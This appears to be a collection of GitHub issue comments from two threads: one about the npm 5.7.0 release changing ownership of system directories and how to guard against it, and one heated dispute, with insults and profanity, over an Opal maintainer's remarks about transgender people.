Apparently the npm developers feel they can do whatever they want with your system. Seriously, this isn't a subtle bug, this is code doing exactly what it claims to do. Which is stupid and clearly nobody tested this on a real system.

Edit: by the way, it took me literally 5 minutes of searching on the terrible GitHub interface to find this. I just searched for chown and followed the crumbs. You've had 12 hours. I don't do node.js and have never looked at the npm codebase before. Seriously, @mikesherov, there is no excuse for writing this in the first place, and even less of an excuse for not fixing it within the first 30 minutes after the report."
4600	"@eli-schwartz  The way u said it now i am 100% with you on this  
Before it was like you complained about this doesnt matter its just another bug to the list...  
And obviously i was being sarcastic "
4601	"> How about we give the two person team more than 24 hours to fix this bug?

While we're at it, can we get #9359 fixed too? It's now 2.5 years, and counting."
4602	@mikesherov what the hell, dude? This is literally breaking production servers due to how bullshit filled npm is. Get real, man.
4603	"@mikesherov 

> I now have a nice neat list of assholes I would never hire.

Thanks for your valuable contribution to this discussion.

> How about we give the two person team more than 24 hours to fix this bug?

How about we don't release pre-releases with a semver tag that looks like a minor patch in the first place?"
4604	"@mikesherov Your comment is somehow contributing even less than those responding with humor about a very serious issue that is being passed of as ""Not our fault"".

This issue has been open for 7 days as a duplicate ticket. There are also issues stemming from 2.5 years ago that have yet to be fixed."
4605	@Arthien I’m sorry if you felt I was directing this to you. The point I was making is that *immature* comments aren’t helping. I’m not blaming anyone for submitting bug reports or asking it be fixed. 
4606	@brunocascio I meant none of the developers tested this on a real system. Of course the poor users did.
4607	"![syl](https://user-images.githubusercontent.com/31551149/36546146-eb2f2a9c-17ea-11e8-9f75-db61ade3ebf4.png)

\*siiip, sip, shhhhrp\*
"
4608	Stop me if this sounds crazy, but maybe we shouldn't rely on just two people to be responsible for a massively important part of modern web technology infrastructure?
4609	Stop me if this sounds crazy, but maybe we shouldn't rely on just two people to be responsible for a massively important part of modern web technology infrastructure?
4610	"@marcan Sorry, It was my mistake. I was trying to remove my comment but ""Unicorn!"" error appears. 😆 "
4611	"@mikesherov 
> The point I was making is that immature comments aren’t helping.

And you've been dead serious in this thread. You just said that anyone in this thread is not competent to pass your high moral standards to be blessed to work next to you.

 >I’m not blaming anyone for submitting bug reports or asking it be fixed.

And all of a sudden you've posted this tweet https://twitter.com/mikesherov/status/966693100876914688 stating the same. 

Now tell me, how does size, height and weight of the team changes the seriousness of the issue?"
4612	"> I was just asking a simple question based on what I know, no need to call others stupid, geez.

I didn't call you stupid, I called your idea stupid. Sometimes, even smart people have stupid ideas.

> This isn't a bug, this is all working exactly as written and intended. There's a correctMkdir function that explicitly uses the sudo caller (not the effective or real user ID) to recursively chown any directory it is called to, and then this function is used all over the place, notably in places like the installation etc directory.


> Apparently the npm developers feel they can do whatever they want with your system. Seriously, this isn't a subtle bug, this is code doing exactly what it claims to do. Which is stupid and clearly nobody tested this on a real system.
> 
> Edit: by the way, it took me literally 5 minutes of searching on the terrible GitHub interface to find this. I just searched for chown and followed the crumbs. You've had 12 hours. I don't do node.js and have never looked at the npm codebase before. Seriously, @mikesherov, there is no excuse for writing this in the first place, and even less of an excuse for not fixing it within the first 30 minutes after the report.

Exactly. You just don't mess around with files or directories that are not yours. It's just a matter of time until it goes wrong ..."
4613	lock?
4614	"> Stop me if this sounds crazy, but maybe we shouldn't rely on just two people to be responsible for a massively important part of modern web technology infrastructure?

This is why standards bodies and governing foundations were formed for other platforms. The cavalier nature of NPM might have let it innovate quickly, but it also leads to problems like this, not to mention the general dissatisfaction of both users and non-users alike."
4615	"I see a lot of complaining, blaming, and no one offering to help. ""If you can't say anything nice, don't say anything at all""
Make a pull request and help out!"
4616	@xdumaine And what innovation, exactly, has npm ever brought to the world of package managers?
4617	"All emotions aside, maybe this is a time for you to consider:
1. Not running things as ""root"" that need not be run as root.
2. Not updating productive systems without first testing those same updates extensively on a non-productive system.

Because software is built by humans, and humans make mistakes."
4618	"> Make a pull request and help out!

Not a single pull request was merged in the last 2 months that came from an outside contributor. There are currently over 70 PRs open and none of them have any activity from the npm team.

EDIT: Last merged PR from an outsider was [back in November](https://github.com/npm/npm/pulls?utf8=%E2%9C%93&q=is%3Apr+is%3Amerged)."
4619	"@jamesjnadeau 
>Make a pull request and help out!

But it's more semver version. Version 5.7.0 should never be tagged and released. And not you are saying shut up and fix it. 
I'd like you to help we with directions, what exactly is should open PR for? "
4620	For those using npm on business production servers: If your stack needs node.js to function you may reconsider the core structure of it. There is no place for a toy language in large to mid-sized enterprises.
4621	"> npm team

![asdf](http://i0.kym-cdn.com/entries/icons/original/000/000/091/TrollFace.jpg)"
4622	"> Not a single pull request was merged in the last 2 months that came from an outside contributor.

Maybe the auto issue closing bot should also do PRs. 🥇 "
4623	"Too much peanut gallery here 
saying that while I contribute to this useless posting "
4624	"![alex-mc](https://user-images.githubusercontent.com/1387642/36548090-462a5420-17e7-11e8-8ca4-1c0e582bc104.gif)
"
4625	"This is a serious and problematic issue. However if you are running versions of critical software, like NPM, in production only hours after it's released you should probably reconsider your deployment procedures. Using the NPM versions tied to the LTS version of Node.js, which you should be using, is plenty greenfield enough.

Humans are fallible and mistakes will always happen, guard against the realities of that in your software stack instead of expeciting perfect humans"
4626	Its always nasty to have such problems. Besides all the talk/memes/etc., has anyone an idea how to **test** the fix and makes sure, that this kind of issue doesn't come up again in the future?
4627	"> has anyone an idea how to test the fix and makes sure, that this kind of issue doesn't come up again in the future?

Yup. It's really easy. Don't do stupid things like messing with directories and files that are not yours."
4628	"> This is a serious and problematic issue. However if you are running versions of critical software, like NPM, in production only hours after it's released you should probably reconsider your deployment procedures. Using the NPM versions tied to the LTS version of Node.js, which you should be using, is plenty greenfield enough.

This is quite correct. It's easy and understandable to miss, but if you have this in your deployment process somewhere:
```
npm install -g npm
```
be more specific about the versioning:
```
npm install -g npm@5.6.0
```
It's similar to using the `latest` tag on Docker images, or `gem install bundler`, or accepting any default definition of ""give me the latest version"". Lock your versions at every step of the process. Be defensive about your deploy process. 👍 "
4629	"Just got the latest Node Weekly, whose first item is:

> *npm v5.7.0 Releasedn*
> pm install can now automatically fix package-lock.json and npm-shrinkwrap.jsonfiles that have merge conflicts, there’s also a new npm ci command.

Just so you know.

"
4630	"Just got the latest Node Weekly, whose first item is:

> *npm v5.7.0 Releasedn*
> pm install can now automatically fix package-lock.json and npm-shrinkwrap.jsonfiles that have merge conflicts, there’s also a new npm ci command.

Just so you know.

"
4631	@k0nserv Still you can really mess up your dev machine. Things like this should never, ever happen. And they're happening a little too often to Node 😒
4632	I'm not heavily invested in this issue, but if you want this thread to feature more rational discussion, tweeting about it is probably a bad idea.
4633	"I almost hate to contribute to this, but a hopefully informative bit of information:

This issue is made worse by the version tagging
```
latest: 5.6.0
next: 5.7.0
```

because `npm upgrade` does _not_ take that into account and will pull the newest version (5.7.0).

Because of this, you should _not_ `npm upgrade -g npm` or else you will get these pre-release builds. npm itself will tell you to run `npm install -g npm` isntead, which _does_ pull `latest` and ignore that `next` is newer:

```
~ 🐒   npm -v
5.5.1


   ╭─────────────────────────────────────╮
   │                                     │
   │   Update available 5.5.1 → 5.6.0    │
   │     Run npm i -g npm to update      │
   │                                     │
   ╰─────────────────────────────────────╯

~ 🐒   npm i -g npm
+ npm@5.6.0
added 27 packages, removed 11 packages and updated 38 packages in 7.544s

~ 🐒   npm -v
5.6.0

~ 🐒   npm upgrade -g npm
+ npm@5.7.0
added 63 packages, removed 6 packages and updated 49 packages in 8.432s

~ 🐒   npm -v
5.7.0
```

so you can protect yourself from inadvertently getting these pre-release builds into our production environments by sticking to `npm i -g`."
4634	I'm not heavily invested in this issue, but if you want this thread to feature more rational discussion, tweeting about it is probably a bad idea.
4635	Maybe this helps to dismantle the js bloat ecosystem which is slowly making the internet unusable.
4636	"> Its always nasty to have such problems. Besides all the talk/memes/etc., has anyone an idea how to test the fix and makes sure, that this kind of issue doesn't come up again in the future?

Yes, run it in a CI environment set up with selinux or apparmor configured to deny npm any action outside of its own work area. If it runs and doesn't break, chances are it won't corrupt the system. Maybe itself, but at least not the system.
"
4637	"> Its always nasty to have such problems. Besides all the talk/memes/etc., has anyone an idea how to test the fix and makes sure, that this kind of issue doesn't come up again in the future?

Yes, run it in a CI environment set up with selinux or apparmor configured to deny npm any action outside of its own work area. If it runs and doesn't break, chances are it won't corrupt the system. Maybe itself, but at least not the system.
"
4638	"> @k0nserv Still you can really mess up your dev machine. Things like this should never, ever happen. And they're happening a little to often to Node. :(

You should be running the same versions of NPM/Node.js in dev as production so this is a non problem. The current LTS is 8.9.4 it comes with NPM 5.6.0. Just stay on a recent LTS release and use the NPM versions bundled with it."
4639	"![firerises](https://user-images.githubusercontent.com/17237624/36550156-e31e0030-17f4-11e8-9599-d77f6eda4004.jpg)

1. Be a dev on one of the most critical pieces of on infrastructure of a widely used language.
2. Release new prerelease.
3. Do not use semantic versioning so it looks like a stable.
4. Advertise new build in emails and blog posts but don't mention it's a prerelease.
5. The update mechanism updates to next instead of latest for whatever reason
6. It bricks everyone's systems.
7. Users are reasonably upset.
8. Insult users for being upset.

It might be time for an expansion of the NPM team and a review of the current developers on it."
4640	"Thank you to everyone who is ranting about us posting immature bullshit on this bug report. I now have a nice neat list of assholes I would never hire.

How about we give the two person team more than 24 hours to run `npm unpublish npm@5.7.0` ?"
4641	"> How about we give the two person team more than 24 hours to run `npm unpublish npm@5.7.0`

I'm not sure if you're joking, but that command only allows unpublishing versions published within 24 hours, and not older."
4642	That's okay, it was tagged 19 hours ago...
4643	FYI: `npm@5.7.1` got released a few hours ago and resolves this issue. 5.7.0 will promptly fade into oblivion :) Cheers.
4644	Looking back at my reaction this week, I realize that in the moment my responses were inappropriate and I have decided to delete the comment. Obviously, hiring decisions for any organization that I work for are based on wider evaluations of each individual’s background and qualifications. To anyone I may have offended, please accept my sincere apologies.
4645	"If you want him removed, start working on Opal and contributing as much as him to everything he did for Opal so we have a replacement that's more in orientation with your morals and views.

Protip: you won't because you can't.
"
4646	"Also to elaborate more on that, Opal is a technology, technology is moral-less, if a transgender contributor appeared @elia's views wouldn't even appear in here, because why would anyone care, bring contributions, they will be accepted with open arms, bring morals and politics in here, and you will be shown the metaphorical door.
"
4647	"As a queer person this sort of argument from a maintainer makes me feel unwelcome. The ignorance which @elia shows by claiming that transfolk are ""not accepting reality"" is actively harmful.

I will not contribute to this project or any other project which @elia maintains.
"
4648	"@elia is free to have his opinions, in the case he'll bring his views against anyone contributing based on any of their mental or physical attributes, then it would be reason to tell him not to do that.

As you @strand, are free to not contribute to Opal, feel free to use any other Ruby to JavaScript technology.
"
4649	"The opal team, though, is not a technology. Contributing to a software project also means contributing to the works of others, requiring mutual respect.

Requesting contributions before being heard is a pretty low stab as well - you are basically saying that opinions gain worth with merit.
"
4650	"The personal views of a maintainer, as long as they are not influencing in a discriminatory way the contributions accepted in a project, should be off-limits for discussion IMHO. It pains me to see this even be an issue here. Thanks @meh for stating what should be obvious.
"
4651	"Damn. I found out about this project thanks to this issue, and it's super relevant to my interests. But not going to come near it with a thousand foot pole if these are the people I'd have to interact with.
"
4652	"To @meh and others who think that OSS is a moral-free zone: https://modelviewculture.com/pieces/the-dehumanizing-myth-of-the-meritocracy

Pro tip: you won't read it because you don't care.
"
4653	"> The opal team, though, is not a technology. Contributing to a software project also means contributing to the works of others, requiring mutual respect.

Bingo. If developers can't trust the Opal team to treat them with respect, why would they want to use and contribute to Opal?

Is the Opal team really willing to value a single contributor now over hundreds of users and contributers in the future? Seems pretty short-sighted to me.
"
4654	"@skade @elia is not telling anyone to not contribute to Opal because of their mental or physical attributes, and there isn't any unwelcoming to anyone contributing, he's free to say anything he wants, like you are, as long as it doesn't get in the way of the project.

And requesting someone to be removed because of their views without even knowing what their work is, is as much of a low stab.
"
4655	"> Protip: you won't because you can't.

Being this dismissive of someone is not really a great way to run an OSS project. You will lose out as people feel less welcome.

Also Coraline has been in the industry for many years, and is one of the most seasoned developers I know. This was not a fair stab.
"
4656	"@aredridel as long as you interact with the people about the technology, you will be welcome and treated with respect.

When you bring something completely unrelated, then you aren't, as simple as that. It's like I started talking about candy in here, it is not the place.
"
4657	"“The personal views of a maintainer, as long as they are not influencing in a discriminatory way the contributions accepted in a project” – the personal views of the maintainer influence even the contributions _submitted to_ a project (including both patches and involvement in the community). They won’t be accepted because you never even get to see them.

“not telling anyone to not contribute to Opal” – no, but he’s dissuading them from participating just by espousing these biases.
"
4658	"Exactly: as long as I interact solely about the technology, and who I am is never mentioned, I'm welcome to participate and be respected. This is second class participation, and this is not respect.
"
4659	"@CoralineAda I won't read it because it is not relevant to the project.

If you want to tell people to not come near Opal because one of the people working on it doesn't like what you like, then feel free to, nobody is forcing anyone to use or not use Opal.
"
4660	"@aredridel you don't mention who you are because it doesn't matter, at all.

Why would you bring it up when asking questions or discussing something related to Opal? It's completely irrelevant.
"
4661	"You want an active contributer removed from the project because of his political views? Seriously? And you're calling _him_ discriminatory? _Sigh._
"
4662	"I really can't imagine myself not wanting to contribute to an OSS project until I have vetted the personal views on a variety of issues of every single maintainer. This is madness, and frankly it's very hard for me to believe that's actually what some of you are saying...
"
4663	"It's not the views: it's how he interacts with others. Views held close are hard to care about. Views taken out in public, about people in that public? That requires care and consideration.
"
4664	"@fivetanley because wanting a core contributor out because he doesn't like candy and you do is not dismissive?

I don't care how long @CoralineAda has been in the industry, this is irrelevant to the project.
"
4665	"@aredridel if he doesn't interact that way with people when talking about project related things, then it's not an issue for Opal.
"
4666	"Likening transphobia to a penchant for candy is offensive and belies a deeper ignorance. I guess this extends beyond @elia.
"
4667	"@CoralineAda in this particular situation, it is the exact same thing, you don't know anything about my views or who and what I am, and you never will, because it's irrelevant to technology.
"
4668	"@meh This is not about ""what [someone] likes"". It's about _who a person is_. That you think this is the same thing is why there's a problem, and why people are saying they don't feel safe in your community.
"
4669	"@meh many of your views are easy to discern from your comments here. 

All I'm saying: the reaction to this thread is a reason why I'd go from 'Oh, this software is cool' to ""nope, not in a million years"". It's that I've got the energy to spare that I'm willing to speak up and say something.
"
4670	"> because wanting a core contributor out because he doesn't like candy and you do is not dismissive?

No, I'm saying you not even browsing Coraline's github to measure ""merit"" is dismissive; her work and expertise in ruby obviously speaks for itself.

Also comparing people to candy is really dehumanizing and makes me really sad. As someone who often works on JS transforms I had been interested in opal for a while, but now I won't contribute. The way you treat Coraline by not at least listening and asking questions, and also the way you are talking to me, tells me everything about the way you run the project.

Farewell. I'm sure others will be able to expound their views more clearly.
"
4671	"@sipple who and what a person is, is irrelevant to the project, as long as those things aren't brought up in the project itself, and they shouldn't be, because there's no need to.
"
4672	"@aredridel you're welcome to use any other Ruby to JavaScript technologies, nobody is forcing you to use Opal or contribute to it.

If it works for you, use it, if it doesn't, don't.
"
4673	"@aredridel also I assure you, trying to deduce my views on these comments will lead you nowhere true.
"
4674	"@fivetanley because I'm sure @CoralineAda checked all @elia has done for Opal before coming here and wanting him out because they don't agree on things that have nothing to do with Opal itself.

If you want to see how the project is ran, check issues and discussions that were actually relevant to the project.

But as @CoralineAda said, you won't because you don't care.
"
4675	"No, I won't because of how THIS issue is being treated.
"
4676	"@aredridel and you're free to think and do what you think is best, godspeed.
"
4677	"@meh You've said that you're committed to creating a welcoming environment for new contributors. Saying that is easy. Doing that is hard. You're failing at it: right now, as a queer woman, I do not believe Opal would treat any contributions I might make fairly. I do not believe that I would be welcomed onto the project.
"
4678	"@bhaibel why do you even have to say who and what you are? It's irrelevant to any contribution, or question, or request for help, or discussion.

Want to talk about the technology? You're welcome to and you will be treated with respect.

Want to talk about what you're going to do on the weekend? This is not the place.
"
4679	"> because wanting a core contributor out because he doesn't like candy and you do is not dismissive?

@meh jesus christ. this isn't about ""not liking candy"", you fucking muppet, it's about making public statements against a class of people based on a core part of who they are. this is not. the same. fucking. thing.

if someone has openly expressed hostility toward me or people like me in one context, of course I'm not going to be fucking comfortable interacting with them in another context.
"
4680	"@erisdev Stay civil. People are reading this.
"
4681	"You cannot separate people from the technology they create or the technology they use. Ever. It's not possible. I cannot work with people if they bring to the table with them the idea that I, as a human, am _wrong_ about who I fundamentally am at my core. This isn't about someone's ""political"" views - it's about him not seeing some people as even being _human_
"
4682	"_this is not respect right now_, so it's obvious that we will not be treated with respect.
"
4683	"@erisdev in this context, it is the same thing, why? Because it's as irrelevant.

If we were talking about these issues onto themselves, I agree with you.
"
4684	"@meh it is absolutely not. read the edit to my other comment.
"
4685	"@jdax you can, if they don't bring those views when working together on the project. And why would they? It's irrelevant to the project.

Sometimes people don't like eachother, that's normal, you can't demand to like everyone you work with, that doesn't mean you can't work with them and then both of you go out with your own friends.
"
4686	"This issue is a case study in how the open source community systematically protects abusers and excludes LGBT developers. A white cisgender man can publicly claim that transgender people are delusional and suffer zero consequences in the open source community.

What do you think an LGBT developer thinks when they see this? Do they see a safe, welcoming environment where their identities and well-being will be respected and protected? Or a callous, self-serving machine that ruthlessly prioritises short-term technical goals over all else?

You can't divorce your choices from their sociopolitical context just because it's convenient for getting a bunch of code shipped. If you're choosing to collaborate with somebody despite knowing about their prejudice against the LGBT community, then that's a choice you're consciously making. It's a choice that reveals a personal belief system which prioritises code over people.

Maybe you're fine with that, but a growing number of us in the wider community of developers are not. I'm not attempting to change your mind. I just want to add my voice to those stating ""this is not okay by me either"". As much as I hate to spam your project's issue with a non-technical comment, I hate the idea of being complicit in my silence even more.
"
4687	"@erisdev being unable to work with people you don't like when the interactions are strictly professional, is entirely your problem.
"
4688	"@aredridel because wanting a core contributor thrown out because of who they are is respectful?
"
4689	"So very well said, @hnrysmth
"
4690	"@hnrysmth :+1: 
"
4691	"@meh calling me delusional isn't exactly professional, buddy ol' pal.
"
4692	"I see a bunch of LGBT people talking about everything else besides code in this issue. I wasn't aware issue trackers were for people.
"
4693	"@meh I'd rather censure, really. But you're confusing who someone is with their actions.
"
4694	"OSS projects are, at their core, about people. People who choose to come together to donate their time and attention to collaborate on a shared problem. Good technology is a side-effect of good people, well cared for. If you think you can produce technology without caring about people, you either misunderstand tech, or you are happy to limit your pool of contributors to people with a lot of privilege and a thick skin, i.e. the usual suspects: aggressive young white men. 
"
4695	"@erisdev I haven't said you were delusional.
"
4696	"We'll get to talking code if this is shown to be a place that's respectful. Turns out ... people shit on us all the time.
"
4697	"@andrewmcwatters I see a dude posting passive aggressive complaints about the topic and not adding anything to the conversation.

@meh I literally did not say _you_ said it. it was the other guy, the guy this whole issue was about in the first place.
"
4698	"And what happens when I start commiting and someone who doesn't view LGBT people as _human_ starts making commit messages that might look like funny in-jokes but use slurs? Or uses those slurs in issue trackers? Or the IRC channel? It's not my problem if I can't work with someone who doesn't think I'm even a human being. It's the problem of the person who thinks some people are more worthy of respect than others.
"
4699	"@hnrysmth +1
"
4700	"@nslater, @erisdev Passive aggressive? I generally think about code when I think about OSS projects, not politics. It doesn't help to speak unprofessionally to others when you want to make a point.
"
4701	"@meh if your key contributor spends his free time burning crosses in black people's back yards, would you consider that ""political views""? ""Leave him alone, he doesn't openly discriminate against black people in his code"" feels pretty hollow.

Obviously not the same thing, but I draw the parallel because these aren't ""I think the tax policy is stupid"" type politics. The sort of views you're writing off as ""politics"" are views that actively discriminate against entire groups of people. Those people, oddly enough, don't want to work with or interact with said developer, and by extension, your project.
"
4702	"@andrewmcwatters That, right there, is a political statement.
"
4703	"@andrewmcwatters when I think about OSS, I think of community management, emotional labour, and risks to my mental health. That you don't is a product of your privilege.
"
4704	"> This issue is a case study in how the open source community systematically protects abusers and excludes LGBT developers.

Nobody is being excluded in any way.

> A white cisgender man can publicly claim that transgender people are delusional and suffer zero consequences in the open source community.

He can, because he has freedom of speech, he didn't write it anywhere in the project.

He's free to say that, and you're free to say that's not acceptable, that doesn't have anything to do with Opal.

> What do you think an LGBT developer thinks when they see this? Do they see a safe, welcoming environment where their identities and well-being will be respected and protected? Or a callous, self-serving machine that ruthlessly prioritises short-term technical goals over all else?

What they see is their problem, if they cannot or do not want to work on a project when nobody is being excluded or ignored because of it, then, again, it's their problem.

If @elia had done that in an issue, on gitter, on the mailing list, on IRC, on StackOverflow, then I agree, that IS a problem and it should be fixed.

But that's not the case, he said that on HIS Twitter, stating HIS opinion, like you're stating YOURS.

> You can't divorce your choices from their sociopolitical context just because it's convenient for getting a bunch of code shipped. If you're choosing to collaborate with somebody despite knowing about their prejudice against the LGBT community, then that's a choice you're consciously making. It's a choice that reveals a personal belief system which prioritises code over people.

Yes, it's a choice, you're free to not work with those people, it's YOUR choice.

> Maybe you're fine with that, but a growing number of us in the wider community of developers are not. I'm not attempting to change your mind. I just want to add my voice to those stating ""this is not okay by me either"". As much as I hate to spam your project's issue with a non-technical comment, I hate the idea of being complicit in my silence even more.

It's not a problem of a project that someone has differing ideas, everyone has their own and they should learn to work together.

And how do they do that? Not by agreeing, but by knowing what is relevant and what is not.
"
4705	"@nslater nailed it.
"
4706	"Pretty sure that _people_ write code, _people_ review code and _people_ release code. If said people are discriminatory towards contributors, there's absolutely no reason for the project to even bother being open if they can't shed bigoted views of the world to accept what would be a potential new long-time contributor to a project.

As others as mentioned, I'll personally blacklist all of the maintainer's projects.

SIDE-NOTE: Freedom of speech != hate speech. Just because you can say it doesn't mean it has to be tolerated.
"
4707	"btw folks get sacked all the fucking time from public-facing jobs (which being an OSS developer absolutely is! you interact with your users whenever they file bug reports or contribute to your project) for expressing hateful views like this.
"
4708	"> Nobody is being excluded in any way.

This thread and how it is being handled pretty much means it'll be my only interaction with this project. That's exclusion, in practice if not rules.
"
4709	"> OSS projects are, at their core, about people.

No, they're MADE by people, OSS projects are, at their core, projects.

> People who choose to come together to donate their time and attention to collaborate on a shared problem.

Because they need it, they have no reason to show any prejudice when working together, why? Because it's irrelevant.

> Good technology is a side-effect of good people, well organised. If you think you can produce technology without caring about people, you either misunderstand tech, or you are happy to limit your contributors to people with a lot of privilege and a thick skin, i.e. the usual suspects: aggressive young white men.

People do what they can do, and do not what they cannot, that's obvious.
"
4710	"@aredridel yep. classic ""I don't see a problem so you must be making it up"".
"
4711	"It's really quite telltale how every single post here discarding this as a non-issue so far was from white, presumably straight and cis dudes. Of course it's a non-issue for you. For others, not so much.
"
4712	"> It's not a problem of a project that someone has differing ideas, everyone has their own and they should learn to work together.

There are things you can work together over, like ""I think we should use tabs"" and things you can't like ""I'm going to defend slurs in commit messages, or state that this project is apolitical in a way that entrenches the existing contributors and their views""
"
4713	"@erisdev ah okay, my bad, now I understand what you meant, yes, it would have been unprofessional if he said that while working on the project, but he did not.
"
4714	"Thank you for not trying to argue around the central theme of my comment, which is that you're a lousy person if you'll work with somebody like that just to get your damn code shipped.
"
4715	"@meh hypothetical/hyperbolic question: would you work with a child molester if he produced good code?
"
4716	"> And what happens when I start commiting and someone who doesn't view LGBT people as human starts making commit messages that might look like funny in-jokes but use slurs? Or uses those slurs in issue trackers? Or the IRC channel? It's not my problem if I can't work with someone who doesn't think I'm even a human being. It's the problem of the person who thinks some people are more worthy of respect than others.

Yes, if that is what happens, I agree, that's a problem and it must be fixed, as I already said.

But that's not what happened.
"
4717	"> We'll get to talking code if this is shown to be a place that's respectful. Turns out ... people shit on us all the time.

How can it be shown as such if the situation doesn't arise?
"
4718	"@nslater :+1: :+1: :+1: 

Btw, half of this discussion wouldn't happen without the very harsh and personal answer @meh wrote when closing the issue. That answer expresses exactly what are his opinions about (the lack of) tech diversity. If this doesn't prove how individuals opinions are pervasive in OSS culture (not only tech), I don't know what does.
"
4719	"> Pretty sure that people write code, people review code and people release code. If said people are discriminatory towards contributors, there's absolutely no reason for the project to even bother being open if they can't shed bigoted views of the world to accept what would be a potential new long-time contributor to a project.

I agree with that, if such a situation arose, it would be a problem, but it hasn't arisen.

> As others as mentioned, I'll personally blacklist all of the maintainer's projects.

And you are free to do that.

> SIDE-NOTE: Freedom of speech != hate speech. Just because you can say it doesn't mean it has to be tolerated.

I disagree, it's either total freedom of speech, or it's not freedom. Partial freedom is not freedom.
"
4720	"> btw folks get sacked all the fucking time from public-facing jobs (which being an OSS developer absolutely is! you interact with your users whenever they file bug reports or contribute to your project) for expressing hateful views like this.

And the company employing them has the right to do so.
"
4721	"Freedom of speech != freedom from consequences. And if you say ""trans people aren't human"" you're gonna face some consequences. And right now you're consequences are people do not feel safe contributing to this project or using it!
"
4722	"Sounds like their problem when no one is stopping them.
"
4723	"> @meh if your key contributor spends his free time burning crosses in black people's back yards, would you consider that ""political views""? ""Leave him alone, he doesn't openly discriminate against black people in his code"" feels pretty hollow.

Yes, what he does in his free time is completely irrelevant.

> Obviously not the same thing, but I draw the parallel because these aren't ""I think the tax policy is stupid"" type politics. The sort of views you're writing off as ""politics"" are views that actively discriminate against entire groups of people. Those people, oddly enough, don't want to work with or interact with said developer, and by extension, your project.

And they are free to do so. Want to use the technology? Use it. Do not want to? Don't.
"
4724	"> @meh hypothetical/hyperbolic question: would you work with a child molester if he produced good code?

Yes.
"
4725	"@meh :+1: Well said. Keep these things separate.
"
4726	"> Yes, what he does in his free time is completely irrelevant.

And yet it leads right back to here. ""who is this guy?"" ""an opal developer. Says in his profile."" He is representing this project.
"
4727	"> Thank you for not trying to argue around the central theme of my comment, which is that you're a lousy person if you'll work with somebody like that just to get your damn code shipped.

And you're free to hold that opinion.
"
4728	"> Freedom of speech != freedom from consequences. And if you say ""trans people aren't human"" you're gonna face some consequences. And right now you're consequences are people do not feel safe contributing to this project or using it!

If they cannot separate things, it's entirely their problem. They're free to disagree with @elia as @elia is free to disagree with them, that doesn't mean it will affect the interactions related to Opal.
"
4729	"> Btw, half of this discussion wouldn't happen without the very harsh and personal answer @meh wrote when closing the issue. That answer express exactly what are his opinions about (the lack of) tech diversity. If this doesn't prove how individuals opinions are pervasive in OSS culture (not only tech), I don't know what does.

The issue was on the issue tracker of Opal, and the issue wasn't related to Opal, it was related to differing opinions of @CoralineAda and @elia, on words said outside of Opal.
"
4730	"> And yet it leads right back to here. ""who is this guy?"" ""an opal developer. Says in his profile."" He is representing this project.

He is not representing anyone but himself. If you let what and who is affect your decision on using something he works on, it would be the same as he having his decisions affected on what and who anyone else is, which is the core of the issue at hand.
"
4731	"> @meh jesus christ. this isn't about ""not liking candy"", you fucking muppet

I find @erisdev's taking the Lord's name in vain and using profanity to be deeply insulting to my religious beliefs. 

I will not use any project that @erisdev contributes to.
"
4732	"@jedstraw :+1: There's more than one side to this story. If you want to encourage a friendly development ecosystem, you need to start with yourself.
"
4733	"@jedstraw @andrewmcwatters good, I don't want you using my software. do you think this is some kind of joke?
"
4734	"> It's really quite telltale how every single post here discarding this as a non-issue so far was from white, presumably straight and cis dudes. Of course it's a non-issue for you. For others, not so much.

As I said, you don't know, and never will know, who and what I am, because it's irrelevant.
"
4735	"@erisdev No, we don't. But you just publicly discriminated against us for our religious beliefs. Do you see the disconnect here?
"
4736	"@meh Exactly.
"
4737	"@erisdev Not joking at all. The fact that you think I'm joking is just a sign that you have zero empathy for people that share my belief.
"
4738	"@jedstraw is a newly registered account to sockpuppet this issue.
"
4739	"> The issue was on the issue tracker of Opal, and the issue wasn't related to Opal, it was related to differing opinions of @CoralineAda and @elia, on words said outside of Opal.

What basis did you have to say @CoralineAda couldn't contribute if she wanted to, other than your own prejudice against people advocating social justice? That contradicts the core of your argument. Opinions do matter in an OSS project. Unless you're ok with only receiving contribution from straight white dudes. Or not even that, speaking for myself.
"
4740	"@aredridel Yes, it's a newly registered account. I'm not stupid. I don't want to be blackballed in the industry for having conservative religious beliefs. 
"
4741	"@jedstraw @andrewmcwatters cool gaslight brah.
"
4742	"@erisdev ?
"
4743	"@erisdev I don't get that reference
"
4744	"> As I said, you don't know, and never will know, who and what I am, because it's irrelevant.

From this thread, it sounds like you're a robot incapable of human emotions and empathy. Which is just terrible for leading popular open source projects (> 2500 stars!).
"
4745	"@myfreeweb Wouldn't that be the perfect open source contributor? No prejudices, no hate, no emotions at all.
"
4746	"A passion for a project is helpful. But no prejudices or hate should exist within the realm of open source software unless it pertains to development decisions like hating semicolon insertion. :)
"
4747	"@jebrosmund turns out FOSS projects are also human communities and human communities need human leadership that treats humans humanely. because what exactly is software for if it's not for people?
"
4748	"@erisdev Maybe you should treat others politely first, then.
"
4749	"> What basis did you have to say @CoralineAda couldn't contribute if she wanted to, other than your own prejudice against people advocating social justice?

It was a response in the same tone. I treat respect with respect, wanting a core member out because of differing opinions is not respectful.

> That contradicts the core of your argument. Opinions do matter in an OSS project. Unless you're ok with only receiving contribution from straight white dudes. Or not even that, speaking for myself.

I'm okay with anyone contributing as long as they contribute. This was not a contribution, the issue was unrelated to Opal.
"
4750	"@andrewmcwatters there was hostility here before I came in, it just wasn't as strongly worded. ""politeness"" doesn't mean a lot when it's just being lorded over people who feel hurt by something to dismiss their arguments or concerns.
"
4751	"@erisdev I think you confuse hostility with differing opinions.
"
4752	"Sometimes people have opinions that shouldn't ever be respected or tolerated in any community, no matter what that community is building. And ""trans people aren't human"" is one of them. Fin.
"
4753	"> From this thread, it sounds like you're a robot incapable of human emotions and empathy. Which is just terrible for leading popular open source projects (> 2500 stars!).

For all you know I might be a dog, regardless, there's no reason to lead a project as long as everyone is respectful of eachother when interacting about the project, and there's no reason to not be respectful of eachother while interacting about the project because anything unrelated to the project is irrelevant to the project, and thus should not be discussed on the means used to interact about the project.
"
4754	"@andrewmcwatters opinions can be hostile dude. they do not exist in a vacuum.
"
4755	"> @andrewmcwatters there was hostility here before I came in, it just wasn't as strongly worded.

I agree, there was hostility from the start, the issue opener wanted to throw a core contributor out because of differing opinions stated outside of the project.
"
4756	"> @meh hypothetical/hyperbolic question: would you work with a child molester if he produced good code?
> Yes.
> @meh :+1: Well said. Keep these things separate.

Haha yes, of course you can act cool and be able to ""keep things separate"", because it doesn't affect _you_.

What if the child molester would have molested your own children? What if the racist you have to work with would have beat your mother because he/she doesn't like her skin color? Or do this continuously? Or maybe something else that is very bad but difficult to prove?

